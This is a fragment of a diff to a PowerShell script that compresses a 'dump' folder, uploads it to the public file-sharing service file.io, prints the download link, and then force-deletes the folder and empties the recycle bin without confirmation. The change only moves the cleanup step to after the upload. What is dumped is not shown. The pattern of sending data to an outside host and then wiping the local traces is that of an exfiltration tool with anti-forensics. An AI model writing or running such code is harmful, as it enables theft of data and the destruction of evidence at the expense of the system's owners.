@@ -119,16 +119,6 @@ Compress-Archive -Path $folderPath -DestinationPath $zipFilePath
 
 Write-Host "Dump compressed to $sourceFolderPath"
 
-#############################################
-
-# Delete the folder
-Remove-Item -Path $folderPath -Recurse -Force
-
-# Empty the recycle bin
-Clear-RecycleBin -Confirm:$false
-
-Write-Host "Dump folder deleted and recycle bin emptied."
-
 ############################################
 
 # API endpoint for file.io
@@ -146,10 +136,19 @@ $responseString = [System.Text.Encoding]::UTF8.GetString($responseBytes)
 # Close the WebClient
 $webClient.Dispose()
 
-
 # Parse the response JSON to get the link
 $responseObject = ConvertFrom-Json $responseString
 $link = $responseObject.link
 
 # Display the link
 Write-Host "Dump uploaded to $link"
+
+#############################################
+
+# Delete the folder
+Remove-Item -Path $folderPath -Recurse -Force
+
+# Empty the recycle bin
+Clear-RecycleBin -Confirm:$false
+
+Write-Host "Dump folder deleted and recycle bin emptied."
